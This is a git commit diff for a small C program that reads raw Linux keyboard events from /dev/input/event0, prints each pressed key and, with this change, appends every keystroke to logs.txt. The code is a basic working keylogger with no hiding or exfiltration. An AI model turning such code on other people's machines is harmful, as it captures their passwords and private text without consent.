e895fc02210c158703e3ceb9bb5b5dbb4d99ce2e
tylerkennedy <kennedytyler25@icloud.com>
2021-11-15 16:26:38 -0500

    Save keys to file

--- main.c
+++ main.c
@@ -13,7 +13,7 @@
 #include "parse.h"
 
 /* 
- * Convert input stream key code to printable character 
+ * Convert input stream key code to printable character and save to log file 
  */
 static void print_code(int code) {
 	struct parse_event *p;
@@ -23,6 +23,20 @@ static void print_code(int code) {
 			char keycopy[40];
 			strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
 			printf("%s\n", keycopy);
+			
+
+			// Open log file
+			FILE *fp;
+			fp = fopen("logs.txt", "a");
+	
+			if(fp == NULL) {
+				exit(1);
+			}
+
+			// Save key to file
+			fprintf(fp, "%s", keycopy);
+			fclose(fp); // Close file
+			
 			return;
 		}
 	}
@@ -30,7 +44,7 @@ static void print_code(int code) {
 
 int main() {
 
-  // Open keyboard file input stream
+  	// Open keyboard file input stream
 	char* keyboard = "/dev/input/event0"; // Todo: Handle /dev/input/eventX dynamically
 	FILE* f = fopen(keyboard, "r");
 	if (f == NULL) {
@@ -41,41 +55,38 @@ int main() {
 	int fd;
 	struct input_event evt[64]; // Keyboard input event, defined: https://www.kernel.org/doc/Documentation/input/input.txt
 
-  // Read in keyboard input
+  	// Read in keyboard input
 	if (( fd = open(keyboard, O_RDONLY)) < 0) {
 		perror("Cannot read keyboard device input");
 		return 1;
 	}
 
-  // Create a listener to the input stream
+ 	 // Create a listener to the input stream
 	while (1) {
 
-    // Read byte stream from input event
+    		// Read byte stream from input event
 		size_t readbyte = read(fd, evt, sizeof(evt));
 
-    // Check for incorrect reads
+   		 // Check for incorrect reads
 		if (readbyte < (int) sizeof(struct input_event)) {
 			perror("Input too short to read");
 			return 1;
 		}
 
-    // Loop over the input event per byte size
+    		// Loop over the input event per byte size
 		for(int i = 0; i < (int) (readbyte / sizeof(struct input_event)); i++) {
 			if (EV_KEY == evt[i].type) {
         
-	// Never print capslock or shift
+				// Never print capslock or shift
 
-	// Add a check to see if KEY_IS_PRESSED or KEY_KEEPING_PRESSED and key = SHIFT_KEY (probably need to check for left and right). 
-	// Set a boolean variable for shift key to true
-	// Set a boolean variable for caplocks key to true if it is pressed
-	// XOR the value of capslock and shift to determine upper or lowercase
-
-
-				
-	// Essentially skips the events fired before and after a key press
-        // this way only the pressed key value is shown
+				// Add a check to see if KEY_IS_PRESSED or KEY_KEEPING_PRESSED and key = SHIFT_KEY (probably need to check for left and right). 
+				// Set a boolean variable for shift key to true
+				// Set a boolean variable for caplocks key to true if it is pressed
+				// XOR the value of capslock and shift to determine upper or lowercase
+		
+				// Essentially skips the events fired before and after a key press
+        			// this way only the pressed key value is shown
 				if ((evt[i].value == KEY_IS_PRESSED) || (evt[i].value == KEY_KEEPING_PRESSED)) {
-					// printf("%d\n", evt[i].code);
 					print_code(evt[i].code);
 				}
 			}
